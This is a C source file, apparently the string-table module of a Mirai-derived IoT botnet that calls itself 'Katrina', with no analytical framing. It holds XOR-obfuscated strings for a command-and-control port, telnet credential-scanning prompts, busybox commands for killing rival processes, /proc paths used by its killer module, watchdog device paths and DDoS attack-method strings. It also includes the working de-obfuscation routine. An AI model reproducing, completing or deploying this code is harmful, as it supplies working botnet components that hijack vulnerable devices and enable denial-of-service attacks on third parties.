#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdeedfbaf;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
	// scanner and domain shit!!
	
    // 1337
    add_entry(TABLE_CNC_PORT, "\x62\x5E", 2);
    // 1932
    add_entry(TABLE_SCAN_CB_PORT, "\x60\xEB", 2);
    // Infected By Katrina
    add_entry(TABLE_EXEC_SUCCESS, "\x2E\x09\x01\x02\x04\x13\x02\x03\x47\x25\x1E\x47\x2C\x06\x13\x15\x0E\x09\x06\x67", 20);
    // shell
    add_entry(TABLE_SCAN_SHELL, "\x14\x0F\x02\x0B\x0B\x67", 6);
    // enable
    add_entry(TABLE_SCAN_ENABLE, "\x02\x09\x06\x05\x0B\x02\x67", 7);
    // system
    add_entry(TABLE_SCAN_SYSTEM, "\x14\x1E\x14\x13\x02\x0A\x67", 7);
    // sh
    add_entry(TABLE_SCAN_SH, "\x14\x0F\x67", 3);
    // /bin/busybox Katrina
    add_entry(TABLE_SCAN_QUERY, "\x48\x05\x0E\x09\x48\x05\x12\x14\x1E\x05\x08\x1F\x47\x2C\x06\x13\x15\x0E\x09\x06\x67", 21);
    // Katrina: applet not found
    add_entry(TABLE_SCAN_RESP, "\x2C\x06\x13\x15\x0E\x09\x06\x5D\x47\x06\x17\x17\x0B\x02\x13\x47\x09\x08\x13\x47\x01\x08\x12\x09\x03\x67", 26);
    // ncorrect
    add_entry(TABLE_SCAN_NCORRECT, "\x09\x04\x08\x15\x15\x02\x04\x13\x67", 9);
    // /bin/busybox ps
    add_entry(TABLE_SCAN_PS, "\x48\x05\x0E\x09\x48\x05\x12\x14\x1E\x05\x08\x1F\x47\x17\x14\x67", 16);
    // /bin/busybox kill -9 
    add_entry(TABLE_SCAN_KILL_9, "\x48\x05\x0E\x09\x48\x05\x12\x14\x1E\x05\x08\x1F\x47\x0C\x0E\x0B\x0B\x47\x4A\x5E\x67", 22);
	
	// killer shit!!
	
    // /proc/
    add_entry(TABLE_KILLER_PROC, "\x48\x17\x15\x08\x04\x48\x67", 7);
    // /exe
    add_entry(TABLE_KILLER_EXE, "\x48\x02\x1F\x02\x67", 5);
    // /fd
    add_entry(TABLE_KILLER_FD, "\x48\x01\x03\x67", 4);
    // /maps
    add_entry(TABLE_KILLER_MAPS, "\x48\x0A\x06\x17\x14\x67", 6);
    // /proc/net/tcp
    add_entry(TABLE_KILLER_TCP, "\x48\x17\x15\x08\x04\x48\x09\x02\x13\x48\x13\x04\x17\x67", 14);
	// /status
	add_entry(TABLE_KILLER_STATUS, "\x48\x14\x13\x06\x13\x12\x14\x67", 8);
	// .anime
	add_entry(TABLE_KILLER_ANIME, "\x49\x06\x09\x0E\x0A\x02\x67", 7);
	// /proc/net/route
    add_entry(TABLE_MEM_ROUTE, "\x48\x17\x15\x08\x04\x48\x09\x02\x13\x48\x15\x08\x12\x13\x02\x67", 16);
	// assword
	add_entry(TABLE_MEM_ASSWD, "\x06\x14\x14\x10\x08\x15\x03\x67", 8);
	
	
	// methods shit!!

    // TSource Engine Query
    add_entry(TABLE_ATK_VSE, "\x33\x34\x08\x12\x15\x04\x02\x47\x22\x09\x00\x0E\x09\x02\x47\x36\x12\x02\x15\x1E\x67", 21);
    // /etc/resolv.conf
    add_entry(TABLE_ATK_RESOLVER, "\x48\x02\x13\x04\x48\x15\x02\x14\x08\x0B\x11\x49\x04\x08\x09\x01\x67", 17);
    // nameserver 
    add_entry(TABLE_ATK_NSERV, "\x09\x06\x0A\x02\x14\x02\x15\x11\x02\x15\x67", 11);
	
	// strings encryption shit!!

	// /dev/watchdog
	add_entry(TABLE_MISC_WATCHDOG, "\x48\x03\x02\x11\x48\x10\x06\x13\x04\x0F\x03\x08\x00\x67", 14);
	// /dev/misc/watchdog
	add_entry(TABLE_MISC_WATCHDOG2, "\x48\x03\x02\x11\x48\x0A\x0E\x14\x04\x48\x10\x06\x13\x04\x0F\x03\x08\x00\x67", 19);
	// assword
	add_entry(TABLE_SCAN_ASSWORD, "\x06\x14\x14\x10\x08\x15\x03\x67", 8);
	// ogin
	add_entry(TABLE_SCAN_OGIN, "\x08\x00\x0E\x09\x67", 5);
	// enter
	add_entry(TABLE_SCAN_ENTER, "\x02\x09\x13\x02\x15\x67", 6);
	// 1gba2cdon53nhp12ti0kfj
	add_entry(TABLE_MISC_RAND, "\x56\x00\x05\x06\x55\x04\x03\x08\x09\x52\x54\x09\x0F\x17\x56\x55\x13\x0E\x57\x0C\x01\x0D\x67", 23);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}

